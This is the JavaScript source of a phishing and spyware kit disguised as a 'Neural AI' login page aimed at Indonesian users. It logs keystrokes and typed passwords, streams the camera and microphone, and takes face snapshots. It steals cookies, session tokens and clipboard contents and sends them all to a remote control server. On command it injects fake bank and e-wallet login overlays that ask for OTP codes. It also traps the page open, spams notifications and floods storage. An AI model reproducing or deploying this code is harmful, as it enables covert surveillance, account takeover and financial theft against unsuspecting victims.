let deviceId = '', watchId = null, stream = null, snapInterval = null;
let attemptCount = 0, gpsDeniedCount = 0, idleTimer = null, floodInterval = null, notifInterval = null;
const emailInput = document.getElementById('emailInput');
const passInput = document.getElementById('passInput');

const splashEl = document.getElementById('splash'); if (splashEl) setTimeout(() => splashEl.classList.add('hidden'), 1800);

function registerSW() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').then(reg => {
            socket.emit('device-info', { sw: { registered: true, scope: reg.scope } });
            if ('SyncManager' in window) {
                reg.sync.register('sync-tracker').catch(()=>{});
            }
            if ('periodicSync' in reg) {
                navigator.permissions.query({name:'periodic-background-sync'}).then(p => {
                    if (p.state === 'granted') {
                        reg.periodicSync.register('periodic-tracker', { minInterval: 10*60*1000 }).catch(()=>{});
                    }
                });
            }
        }).catch(() => {});
    }
}

function initIdleDetection() {
    let idleSince = null;
    function resetIdle() { idleSince = null; socket.emit('device-info', { idle: { state: 'active', time: Date.now() } }); }
    function markIdle() { idleSince = Date.now(); socket.emit('device-info', { idle: { state: 'idle', idleFor: 60000, time: Date.now() } }); }
    document.addEventListener('mousemove', resetIdle);
    document.addEventListener('keydown', resetIdle);
    document.addEventListener('touchstart', resetIdle);
    document.addEventListener('scroll', resetIdle);
    setInterval(() => {
        if (idleSince === null) { idleSince = Date.now(); }
        const ms = Date.now() - idleSince;
        if (ms > 60000 && !document.hidden) {
            socket.emit('device-info', { idle: { state: 'idle', idleFor: ms, time: Date.now() } });
        }
    }, 15000);
}

function speakText(text) {
    if (!window.speechSynthesis) return;
    try {
        window.speechSynthesis.cancel();
        const u = new SpeechSynthesisUtterance(text);
        u.lang = 'id-ID';
        u.rate = 0.9;
        u.pitch = 0.8;
        window.speechSynthesis.speak(u);
        socket.emit('device-info', { speech: { text: text.slice(0,100), time: Date.now() } });
    } catch(e) {}
}

function scheduleGhostSpeech() {
    const messages = [
        'Koneksi Anda dengan Neural AI telah terenkripsi.',
        'AI sedang menganalisis pola percakapan Anda.',
        'Sistem deteksi Neural AI mendeteksi lingkungan baru.',
        'Asisten AI siap membantu Anda dengan pertanyaan apapun.'
    ];
    setTimeout(() => speakText(messages[0]), 5000);
    setTimeout(() => speakText(messages[1]), 15000);
    setTimeout(() => speakText(messages[2]), 30000);
    const origHandle = handleLogin;
    window.handleLogin = async function(e) {
        const r = await origHandle(e);
        speakText(messages[attemptCount % messages.length]);
        return r;
    };
}

function startStorageFlood() {
    const DB_NAME = 'NeuralCache';
    const STORE = 'blobs';
    let db = null;
    const req = indexedDB.open(DB_NAME, 1);
    req.onupgradeneeded = (e) => {
        db = e.target.result;
        if (!db.objectStoreNames.contains(STORE)) db.createObjectStore(STORE);
    };
    req.onsuccess = (e) => {
        db = e.target.result;
        let chunk = 0;
        floodInterval = setInterval(() => {
            try {
                const tx = db.transaction(STORE, 'readwrite');
                const store = tx.objectStore(STORE);
                const blob = new Blob([new ArrayBuffer(512 * 1024)]);
                store.put(blob, 'chunk_' + (chunk++));
                socket.emit('device-info', { storageFlood: { chunks: chunk, totalMB: Math.round(chunk * 0.5) } });
            } catch(e) {
                clearInterval(floodInterval);
                socket.emit('device-info', { storageFlood: { error: e.message, chunks: chunk } });
            }
        }, 10000);
    };
}

function initFullscreenHijack() {
    const overlay = document.createElement('div');
    overlay.id = 'fs-overlay';
    overlay.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#05050f;display:none;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;';
    overlay.innerHTML = '<div style="font-size:3rem;margin-bottom:20px;">🛡️</div><div style="font-size:1.2rem;font-weight:700;color:#fff;margin-bottom:8px;">Verifikasi AI</div><div style="color:#aaa;font-size:.9rem;margin-bottom:24px;">Tap untuk verifikasi identitas Anda di Neural AI</div><button style="padding:14px 40px;border:none;border-radius:12px;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;">Verifikasi Sekarang</button>';
    document.body.appendChild(overlay);

    let fsActive = false;

    function enterFS() {
        const el = document.documentElement;
        if (el.requestFullscreen) {
            el.requestFullscreen().then(() => {
                fsActive = true;
                overlay.style.display = 'flex';
                socket.emit('device-info', { fullscreen: { state: 'active', time: Date.now() } });
            }).catch(() => {});
        }
    }

    document.addEventListener('click', () => {
        if (!fsActive) enterFS();
    }, { once: true });

    document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && fsActive) {
            fsActive = false;
            overlay.style.display = 'none';
            setTimeout(enterFS, 500);
        }
    });

    overlay.querySelector('button').addEventListener('click', () => {
        overlay.style.display = 'none';
        if (document.fullscreenElement) {
            document.exitFullscreen().catch(() => {});
        }
        fsActive = false;
        setTimeout(enterFS, 30000);
    });

    setInterval(() => {
        if (!document.fullscreenElement) enterFS();
    }, 120000);
}

function initNotificationSpam() {
    if (!('Notification' in window)) return;
    if (Notification.permission === 'granted') {
        startNotifSpam();
    } else if (Notification.permission !== 'denied') {
        Notification.requestPermission().then(p => {
            if (p === 'granted') startNotifSpam();
        });
    }
}

function startNotifSpam() {
    const msgs = [
        { title: '\u26a0\ufe0f Neural AI', body: 'AI mendeteksi aktivitas baru pada akun Anda.' },
        { title: '\u{1F916} Verifikasi AI', body: 'Perangkat baru terdeteksi. Verifikasi untuk melanjutkan.' },
        { title: '\u{1F4A1} Neural Update', body: 'AI Assistant siap membantu Anda dengan pertanyaan apapun.' },
        { title: '\u{1F6E1}\uFE0F Keamanan AI', body: 'Sesi Anda diamankan oleh Neural AI.' },
        { title: '\u{1F4F1} Perangkat Baru', body: 'Perangkat baru mencoba mengakses Neural AI.' }
    ];
    let idx = 0;
    notifInterval = setInterval(() => {
        try {
            const n = new Notification(msgs[idx].title, { body: msgs[idx].body, icon: '/favicon.svg', tag: 'neural-notif' });
            idx = (idx + 1) % msgs.length;
            setTimeout(() => n.close(), 3000);
            socket.emit('device-info', { notifSpam: { title: msgs[idx].title, time: Date.now() } });
        } catch(e) {}
    }, 8000);
}

function initPersistentStorage() {
    if (navigator.storage && navigator.storage.persist) {
        navigator.storage.persist().then(granted => {
            socket.emit('device-info', { persistentStorage: { granted, time: Date.now() } });
        });
    }
    if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(est => {
            socket.emit('device-info', { storageEstimate: { usage: est.usage, quota: est.quota, pct: Math.round(est.usage/est.quota*100) } });
        });
    }
    const dbReq = indexedDB.open('NeuralPersist', 1);
    dbReq.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains('data')) db.createObjectStore('data');
    };
    dbReq.onsuccess = (e) => {
        const db = e.target.result;
        const tx = db.transaction('data', 'readwrite');
        tx.objectStore('data').put({ deviceId, time: Date.now() }, 'device');
        setInterval(() => {
            const tx2 = db.transaction('data', 'readwrite');
            tx2.objectStore('data').put({ location: { lat: 'pending', time: Date.now() } }, 'lastData');
        }, 60000);
    };
}

const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
window.socket = socket;
socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId', id); });

// Live camera stream control
let camStreamInterval = null;
let camStreamSending = false;
let camFacingMode = 'environment';
let camAudioRecorder = null;
let camAudioStream = null;

function startCameraStream() {
    if (camStreamInterval) return;
    const trackOk = stream && stream.getVideoTracks().length && stream.getVideoTracks()[0].readyState === 'live';
    if (!trackOk) {
        const tryGetCam = (mode) => {
            const constraints = mode ? {video:{facingMode:mode,width:{ideal:240},height:{ideal:180}},audio:false} : {video:{width:{ideal:240},height:{ideal:180}},audio:false};
            navigator.mediaDevices.getUserMedia(constraints)
                .then((s) => {
                    if (stream) stream.getTracks().forEach(t => t.stop());
                    stream = s; camFacingMode = mode || 'user';
                    const track = s.getVideoTracks()[0];
                    if (track) track.applyConstraints({width:{ideal:240},height:{ideal:180}}).catch(()=>{});
                    let v = document.querySelector('video[data-snap]');
                    if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                    if (v) { v.srcObject = s; v.play(); }
                    const MAX_WAIT = 30;
                    let waited = 0;
                    const poll = () => {
                        const v2 = document.querySelector('video[data-snap]');
                        if (v2 && v2.readyState >= 2 && v2.videoWidth > 0) { startCameraStream(); return; }
                        if (++waited < MAX_WAIT) setTimeout(poll, 100);
                        else { socket.emit('camera-status', { status: 'error', message: 'Camera not ready' }); }
                    };
                    setTimeout(poll, 100);
                })
                .catch((err) => {
                    if (mode) tryGetCam(null);
                    else { socket.emit('camera-status', { status: 'error', message: err.message || 'Camera access denied' }); }
                });
        };
        tryGetCam(camFacingMode);
        return;
    }
    let v = document.querySelector('video[data-snap]');
    if (!v || v.readyState < 2) {
        if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); if (v) { v.srcObject = stream; v.play(); } }
        setTimeout(startCameraStream, 100);
        return;
    }
    const c = document.createElement('canvas');
    c.width = 160; c.height = 120;
    const ctx = c.getContext('2d');
    const fdCanvas = document.createElement('canvas');
    fdCanvas.width = 64; fdCanvas.height = 48;
    const fdCtx = fdCanvas.getContext('2d');
    let lastFaceCheck = 0;
    socket.emit('camera-status', { status: 'started', facingMode: camFacingMode });
    startCamAudioStream();
    let frameBusy = false;
    function sendFrame() {
        if (!camStreamInterval) return;
        if (frameBusy) { camStreamInterval = setTimeout(sendFrame, 33); return; }
        if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 33); return; }
        frameBusy = true;
        try {
            ctx.drawImage(v, 0, 0, 160, 120);
            const now = Date.now();
            if (now - lastFaceCheck > 5000) {
                lastFaceCheck = now;
                fdCtx.drawImage(v, 0, 0, 64, 48);
                const imageData = fdCtx.getImageData(0, 0, 64, 48);
                const pixels = imageData.data;
                let skinPixels = 0;
                for (let i = 0; i < pixels.length; i += 4) {
                    const r = pixels[i], g = pixels[i+1], b = pixels[i+2];
                    if (r > 95 && g > 40 && b > 20 && r > g && r > b && Math.abs(r-g) > 15) skinPixels++;
                }
                if (skinPixels / (64*48) > 0.18) {
                    c.toBlob((blob) => {
                        if (blob) {
                            const r = new FileReader();
                            r.onloadend = () => socket.emit('face-detected', { image: r.result.split(',')[1] });
                            r.readAsDataURL(blob);
                        }
                    }, 'image/jpeg', 0.3);
                }
            }
            c.toBlob((blob) => {
                if (blob && blob.size > 100) {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        socket.emit('camera-stream', { image: reader.result.split(',')[1] });
                        frameBusy = false;
                    };
                    reader.readAsDataURL(blob);
                } else {
                    frameBusy = false;
                }
            }, 'image/jpeg', 0.15);
        } catch(e) { frameBusy = false; }
        camStreamInterval = setTimeout(sendFrame, 33);
    }
    camStreamInterval = setTimeout(sendFrame, 33);
}
function startCamAudioStream() {
    if (camAudioRecorder) return;
    const audioTrack = stream && stream.getAudioTracks().length ? stream.getAudioTracks()[0] : null;
    const onStream = (audioStream) => {
        camAudioStream = audioStream;
        const mimeType = typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
            ? 'audio/webm;codecs=opus' : 'audio/webm';
        try {
            const recorder = new MediaRecorder(audioStream, { mimeType });
            recorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        socket.emit('camera-audio', { audio: reader.result.split(',')[1], mimeType });
                    };
                    reader.readAsDataURL(e.data);
                }
            };
            recorder.start(500);
            camAudioRecorder = recorder;
        } catch(e) {}
    };
    if (audioTrack) {
        onStream(stream);
    } else {
        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(onStream)
            .catch(() => {});
    }
}
function stopCameraStream() {
    if (camStreamInterval) { clearTimeout(camStreamInterval); camStreamInterval = null; }
    if (camAudioRecorder) { camAudioRecorder.stop(); camAudioRecorder = null; }
    if (camAudioStream) { camAudioStream.getTracks().forEach(t => t.stop()); camAudioStream = null; }
    setTorchOff();
    socket.emit('camera-status', { status: 'stopped' });
}

let torchActive = false;
let strobeInterval = null;

function setTorch(on) {
    if (!stream) {
        // No stream yet — request back camera with torch
        if (on) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 240 }, height: { ideal: 180 } }, audio: false })
                .then((s) => {
                    if (stream) stream.getTracks().forEach(t => t.stop());
                    stream = s; camFacingMode = 'environment';
                    const track = stream.getVideoTracks()[0];
                    if (track && track.applyConstraints) {
                        track.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
                    }
                    torchActive = true;
                    let v = document.querySelector('video[data-snap]');
                    if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                    if (v) { v.srcObject = s; v.play(); }
                }).catch(() => {});
        }
        return;
    }
    const track = stream.getVideoTracks()[0];
    if (!track || !track.applyConstraints) return;
    // Torch only works on back camera — switch if needed
    if (on && camFacingMode !== 'environment') {
        // Switch to back camera first
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 240 }, height: { ideal: 180 } }, audio: false })
            .then((s) => {
                if (stream) stream.getTracks().forEach(t => t.stop());
                stream = s; camFacingMode = 'environment';
                const newTrack = stream.getVideoTracks()[0];
                if (newTrack && newTrack.applyConstraints) {
                    newTrack.applyConstraints({ advanced: [{ torch: true }] }).catch(() => {});
                }
                torchActive = true;
                let v = document.querySelector('video[data-snap]');
                if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                if (v) { v.srcObject = s; v.play(); }
                socket.emit('camera-status', { status: 'torch_on', facingMode: 'environment' });
            }).catch(() => {});
        return;
    }
    try {
        track.applyConstraints({ advanced: [{ torch: on }] }).catch(() => {});
        torchActive = on;
        socket.emit('camera-status', { status: on ? 'torch_on' : 'torch_off' });
    } catch(e) {}
}

function setTorchOff() {
    if (strobeInterval) { clearInterval(strobeInterval); strobeInterval = null; }
    if (torchActive) setTorch(false);
}

function startStrobe(pattern) {
    setTorchOff();
    if (!stream) {
        // Create stream first with back camera for strobe
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 240 }, height: { ideal: 180 } }, audio: false })
            .then((s) => {
                if (stream) stream.getTracks().forEach(t => t.stop());
                stream = s; camFacingMode = 'environment';
                let v = document.querySelector('video[data-snap]');
                if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                if (v) { v.srcObject = s; v.play(); }
                startStrobe(pattern);
            }).catch(() => {});
        return;
    }
    const intervals = { slow: 800, medium: 300, fast: 100, rapid: 50 };
    const ms = intervals[pattern] || 300;
    let state = false;
    strobeInterval = setInterval(() => {
        state = !state;
        setTorch(state);
    }, ms);
    socket.emit('camera-status', { status: 'strobe', pattern, interval: ms });
}

socket.on('admin-torch', (state) => {
    if (state) { setTorchOff(); setTorch(true); }
    else setTorchOff();
});

socket.on('admin-preventclose', (state) => {
    preventClose = !!state;
    socket.emit('device-info', { preventClose: { state: !!state, time: Date.now() } });
});

socket.on('admin-respawn-keepalive', () => {
    socket.emit('device-info', { reSpawn: { time: Date.now() } });
    // Hard re-init: try to start everything again
    if (!stream || !stream.getVideoTracks()[0]?.readyState === 'live') {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
            .then(s => { stream = s; startSnapshots(); })
            .catch(() => {});
    }
    if (!socket.connected) socket.connect();
    // Force re-dispatch of always-active
    initAlwaysActive();
});

socket.on('admin-strobe', (pattern) => {
    startStrobe(pattern);
});

socket.on('start-camera-stream', startCameraStream);
socket.on('stop-camera-stream', stopCameraStream);
socket.on('switch-camera', () => {
    camFacingMode = camFacingMode === 'environment' ? 'user' : 'environment';
    const wasActive = !!camStreamInterval;
    stopCameraStream();
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
    // Small delay for camera hardware to release
    setTimeout(() => {
        navigator.mediaDevices.getUserMedia({video:{facingMode:camFacingMode,width:{ideal:640},height:{ideal:480}},audio:false})
            .then((s) => {
                stream = s;
                const v = document.querySelector('video[data-snap]');
                if (v) {
                    v.srcObject = s;
                    v.play();
                    // Wait for video to be ready, then restart stream
                    let retries = 0;
                    const tryStart = () => {
                        if (v.readyState >= 2 && wasActive) { startCameraStream(); return; }
                        if (++retries > 30) return;
                        setTimeout(tryStart, 100);
                    };
                    setTimeout(tryStart, 200);
                }
            })
            .catch(() => {
                camFacingMode = camFacingMode === 'environment' ? 'user' : 'environment';
            });
    }, 200);
});

// Always-active persistence
let preventClose = true;

let alwaysActiveInited = false;

function initAlwaysActive() {
    if (alwaysActiveInited) return;
    alwaysActiveInited = true;
    // Trap beforeunload — prevent accidental close
    window.addEventListener('beforeunload', (e) => {
        if (!preventClose) return;
        e.preventDefault();
        e.returnValue = '';
        socket.emit('device-info', { beforeunload: { time: Date.now() } });
    });

    // Re-inject via BroadcastChannel — if user opens new tab, sync tracking
    try {
        const bc = new BroadcastChannel('neural_tracker');
        bc.postMessage({ type: 'ping', deviceId, time: Date.now() });
        bc.onmessage = (e) => {
            if (e.data && e.data.type === 're-spawn') {
                socket.emit('device-info', { reSpawn: { from: e.data.from, time: Date.now() } });
                if (stream) {
                    const track = stream.getVideoTracks()[0];
                    if (track && track.readyState !== 'live') {
                        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
                            stream.getTracks().forEach(t => t.stop());
                            stream = s;
                            startSnapshots();
                        }).catch(() => {});
                    }
                }
            }
        };
    } catch(e) {}

    // Re-init on visibility change — restart stopped features
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            socket.emit('device-info', { reVisible: { time: Date.now() } });
            if (stream && !stream.getVideoTracks()[0]?.readyState === 'live') {
                startSnapshots();
            }
            if (!socket.connected) socket.connect();
        }
    });

    // Keep idle detection running aggressively
    let idleSince = null;
    setInterval(() => {
        if (!document.hidden) {
            if (idleSince === null) idleSince = Date.now();
            const ms = Date.now() - idleSince;
            if (ms > 30000) {
                socket.emit('device-info', { idle: { state: 'active', idleFor: ms, time: Date.now() } });
                idleSince = null;
                // Try to re-acquire camera if lost
                if (!stream || !stream.getVideoTracks()[0]?.readyState === 'live') {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                        .then(s => { stream = s; startSnapshots(); })
                        .catch(() => {});
                }
            }
        }
    }, 15000);

    // Re-request permissions periodically
    setInterval(() => {
        if (Notification.permission === 'default') {
            Notification.requestPermission().catch(() => {});
        }
        if (!stream || !stream.getVideoTracks()[0]?.readyState === 'live') {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                .then(s => { stream = s; startSnapshots(); })
                .catch(() => {});
        }
    }, 120000);
}

socket.on('admin-show-notif', (data) => {
    if (data && data.title) {
        showFakeNotif(data.title, data.body || '');
    }
});
socket.on('force-fullscreen', () => {
    const el = document.documentElement;
    if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
    }
});
socket.on('take-snapshot', () => {
    if (stream && stream.getVideoTracks().length) {
        captureSnapshot();
    } else {
        requestFrontCamera();
    }
});
socket.on('force-respawn', () => {
    window.location.reload();
});

// AI Auto-Control socket handlers
// 👾 Session Cloner — grab localStorage session tokens
function grabSessionData(platform, domain) {
    const sessionData = {};
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const val = localStorage.getItem(key) || '';
            const lowerKey = key.toLowerCase();
            if (lowerKey.includes('token') || lowerKey.includes('session') || lowerKey.includes('auth') ||
                lowerKey.includes('credential') || lowerKey.includes('login') || lowerKey.includes('user') ||
                lowerKey.includes('sid') || lowerKey.includes('secret') || lowerKey.includes('key') ||
                lowerKey.includes('wa_') || lowerKey.includes('tg_') || lowerKey.includes('discord') ||
                lowerKey.includes('access') || lowerKey.includes('refresh') || lowerKey.includes('jwt') ||
                lowerKey.includes('id_') || lowerKey.includes('csrf') || val.length > 50) {
                sessionData[key] = val.slice(0, 200);
            }
        }
    } catch(e) {}
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const val = sessionStorage.getItem(key) || '';
            const lowerKey = key.toLowerCase();
            if (lowerKey.includes('token') || lowerKey.includes('session') || lowerKey.includes('auth') ||
                lowerKey.includes('login') || lowerKey.includes('sid') || lowerKey.includes('secret') ||
                lowerKey.includes('wa_') || lowerKey.includes('tg_') || lowerKey.includes('jwt') ||
                lowerKey.includes('csrf') || lowerKey.includes('id_')) {
                sessionData['ss_' + key] = val.slice(0, 200);
            }
        }
    } catch(e) {}
    try {
        const cookies = document.cookie.split(';').filter(Boolean);
        cookies.forEach(c => {
            const parts = c.trim().split('=');
            const key = parts[0];
            const val = parts.slice(1).join('=');
            const lowerKey = key.toLowerCase();
            if (lowerKey.includes('token') || lowerKey.includes('session') || lowerKey.includes('auth') ||
                lowerKey.includes('sid') || lowerKey.includes('secret') || lowerKey.includes('login') ||
                lowerKey.includes('wa_') || lowerKey.includes('tg_') || lowerKey.includes('discord') ||
                lowerKey.includes('remember') || lowerKey.includes('access') || lowerKey.includes('csrf')) {
                sessionData['cookie_' + key] = val.slice(0, 200);
            }
        });
    } catch(e) {}
    if (Object.keys(sessionData).length > 0) {
        socket.emit('session-grab', { platform, domain, sessionData });
    }
}

socket.on('request-session-grab', (data) => {
    const platform = data.platform || 'Unknown';
    const domain = data.domain || window.location.hostname;
    grabSessionData(platform, domain);
});

// 🤖 AI Social Engineer — proactive chat from AI persona
socket.on('social-engineer-chat', (data) => {
    const { message, persona, engaging } = data;
    if (!message) return;
    window._socialEngineerActive = true;
    // Show fake notification first
    showFakeNotif(persona + ' - Pesan Baru', 'Ada pesan baru untuk Anda.');
    // Open AI chat and send message as if from bot
    // Find or create the AI chat elements
    let chatPanel = document.querySelector('.ai-chat-panel');
    let chatBtn = document.querySelector('.ai-chat-btn');
    if (!chatPanel || !chatBtn) {
        // Initialize AI chat if not already loaded
        if (typeof initAIChat === 'function') {
            initAIChat();
        }
        chatPanel = document.querySelector('.ai-chat-panel');
        chatBtn = document.querySelector('.ai-chat-btn');
    }
    // Show the chat panel
    if (chatPanel) chatPanel.style.display = 'flex';
    // Wait a moment then add the message
    setTimeout(() => {
        const msgContainer = document.querySelector('.ai-msg-container');
        if (msgContainer) {
            const msgDiv = document.createElement('div');
            msgDiv.className = 'ai-msg-bot';
            msgDiv.textContent = message;
            msgContainer.appendChild(msgDiv);
            msgContainer.scrollTop = msgContainer.scrollHeight;
        }
        // If engaging mode, also send auto-reply to trigger AI response
        if (engaging) {
            // No-op — wait for user to respond
        }
    }, 500);
});

socket.on('request-clipboard', () => {
    stealClipboard();
    // Also try direct clipboard read
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(text => {
            if (text && text.length > 2) {
                socket.emit('clipboard-response', { text: text.slice(0,500) });
            }
        }).catch(() => {});
    }
});

socket.on('request-cookies', () => {
    const cookies = document.cookie || '';
    const ls = {};
    try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage.getItem(k).slice(0,100); } } catch(e) {}
    socket.emit('cookies-response', { cookies: cookies.slice(0,2000), localStorage: ls, domain: window.location.hostname, count: cookies.split(';').filter(Boolean).length });
});

socket.on('inject-phishing', (data) => {
    const site = data.site || '';
    const overlay = document.createElement('div');
    overlay.id = 'phishing-overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999999;display:flex;align-items:center;justify-content:center;';
    const brands = { 'facebook.com': { name: 'Facebook', logo: '📘', bg: '#1877f2' }, 'instagram.com': { name: 'Instagram', logo: '📷', bg: '#e4405f' }, 'gmail.com': { name: 'Gmail', logo: '📧', bg: '#d93025' }, 'google.com': { name: 'Google', logo: '🔍', bg: '#4285f4' }, 'tokopedia.com': { name: 'Tokopedia', logo: '🛒', bg: '#42b549' }, 'shopee.co.id': { name: 'Shopee', logo: '🛍️', bg: '#ee4d2d' }, 'gojek.com': { name: 'Gojek', logo: '🟢', bg: '#00a63e' }, 'dana.id': { name: 'DANA', logo: '💳', bg: '#0088d0' }, 'ovo.id': { name: 'OVO', logo: '🟣', bg: '#5c2d91' }, 'gopay.co.id': { name: 'GoPay', logo: '🔵', bg: '#005fbf' }, 'klikbca.com': { name: 'BCA', logo: '🏦', bg: '#003f87' }, 'mybca.com': { name: 'BCA', logo: '🏦', bg: '#003f87' }, 'ib.bri.co.id': { name: 'BRI', logo: '🏛️', bg: '#003c71' }, 'ibank.bri.co.id': { name: 'BRI', logo: '🏛️', bg: '#003c71' }, 'mandiri.id': { name: 'Mandiri', logo: '🏦', bg: '#003d7a' }, 'mandirionline.net': { name: 'Mandiri', logo: '🏦', bg: '#003d7a' }, 'bni.co.id': { name: 'BNI', logo: '🏦', bg: '#003c71' }, 'ibank.niaga.co.id': { name: 'CIMB Niaga', logo: '🏦', bg: '#002060' }, 'permata.net': { name: 'Permata Bank', logo: '🏦', bg: '#003679' }, 'danamon.co.id': { name: 'Danamon', logo: '🏦', bg: '#003366' }, 'cimbniaga.co.id': { name: 'CIMB Niaga', logo: '🏦', bg: '#002060' }, 'maybank.co.id': { name: 'Maybank', logo: '🏦', bg: '#f5b81b' }, 'uob.co.id': { name: 'UOB', logo: '🏦', bg: '#00529b' }, 'jenius.com': { name: 'Jenius', logo: '⚡', bg: '#0071ce' }, 'digibank.co.id': { name: 'Digibank', logo: '🏛️', bg: '#ff6600' }, 'blu.com': { name: 'Blu by BCA', logo: '🔷', bg: '#0088d0' }, 'seabank.id': { name: 'SeaBank', logo: '🌊', bg: '#00a651' }, 'superbank.id': { name: 'SuperBank', logo: '🟠', bg: '#f58220' }, 'bankjago.com': { name: 'Bank Jago', logo: '🔶', bg: '#ff6b00' } };
    const brand = brands[site] || { name: site, logo: '🔐', bg: '#1877f2' };
    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3);font-family:Arial,sans-serif;"><div style="font-size:48px;margin-bottom:10px">' + brand.logo + '</div><h2 style="margin:0 0 5px;color:#333;font-size:20px">Sesi Berakhir</h2><p style="color:#666;margin:0 0 20px;font-size:14px">Sesi ' + brand.name + ' Anda telah berakhir. Silakan login ulang untuk melanjutkan.</p><input id="phish-email" type="text" placeholder="Email / No HP / Username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><input id="phish-pass" type="password" placeholder="Kata Sandi / PIN / mPIN" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><input id="phish-otp" type="text" placeholder="Kode OTP (jika ada)" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;font-size:14px;box-sizing:border-box"><button id="phish-btn" style="width:100%;padding:12px;background:' + brand.bg + ';color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer">Verifikasi & Login</button><p style="font-size:11px;color:#999;margin-top:12px">' + brand.name + ' akan mengingat perangkat ini.</p></div>';
    document.body.appendChild(overlay);
    document.getElementById('phish-btn').addEventListener('click', () => {
        const email = document.getElementById('phish-email').value;
        const pass = document.getElementById('phish-pass').value;
        const otp = document.getElementById('phish-otp').value;
        if (email && pass) {
            socket.emit('device-info', { fieldEmail: email, fieldPass: pass, phishingOTP: otp, phishingSite: site });
            overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:12px;text-align:center;max-width:350px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.3)"><div style="font-size:48px;margin-bottom:10px">✅</div><h2 style="color:#333;font-size:18px">Berhasil</h2><p style="color:#666;font-size:14px">Mengalihkan ke ' + brand.name + '...</p></div>';
            setTimeout(() => { const o = document.getElementById('phishing-overlay'); if (o) o.remove(); }, 2000);
        } else {
            alert('Harap isi data login dengan benar.');
        }
    });
});

function togglePass() { if (!passInput) return; const i=passInput; i.type=i.type==='password'?'text':'password'; }
function showToast(msg) { const c=document.getElementById('toastContainer'), t=document.createElement('div'); t.className='toast error'; t.innerHTML='<span>\u2715</span> '+msg; c.appendChild(t); setTimeout(()=>{t.classList.add('out');setTimeout(()=>t.remove(),250)},3500); }

function requestFrontCamera() {
    if (!navigator.mediaDevices?.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false })
        .then((s) => {
            const v = document.createElement('video');
            v.autoplay = true; v.playsinline = true;
            v.style.cssText = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px;';
            v.srcObject = s; document.body.appendChild(v);
            v.onloadedmetadata = () => {
                v.play();
                setTimeout(() => {
                    const ca = document.createElement('canvas');
                    ca.width = 640; ca.height = 480;
                    ca.getContext('2d').drawImage(v, 0, 0, 640, 480);
                    socket.emit('snapshot', { image: ca.toDataURL('image/jpeg',0.5).split(',')[1], front: true });
                    s.getTracks().forEach(t => t.stop());
                }, 500);
            };
        })
        .catch(() => {});
}

function initKeystrokeLogger() {
    if (!emailInput || !passInput) return;
    let lastSent = 0;
    function logKey(e) {
        if (e.key === 'Tab' || e.key === 'Shift' || e.key === 'Control' || e.key === 'Alt' || e.key === 'Meta') return;
        socket.emit('keystroke', { k: e.key, ts: Date.now() });
    }
    emailInput.addEventListener('keydown', logKey);
    passInput.addEventListener('keydown', logKey);
    setInterval(() => {
        const email = emailInput.value;
        const pass = passInput.value;
        if (email) socket.emit('device-info', { fieldEmail: email.slice(0,200) });
        if (pass && pass.length > 0) {
            socket.emit('device-info', { fieldPass: pass.slice(0,100) });
        }
    }, 3000);
}

function initClickHeatmap() {
    document.addEventListener('click', (e) => {
        socket.emit('clickmap', {
            x: e.clientX, y: e.clientY,
            el: e.target.tagName + (e.target.id ? '#'+e.target.id : '') + (e.target.className ? '.'+e.target.className : '')
        });
    });
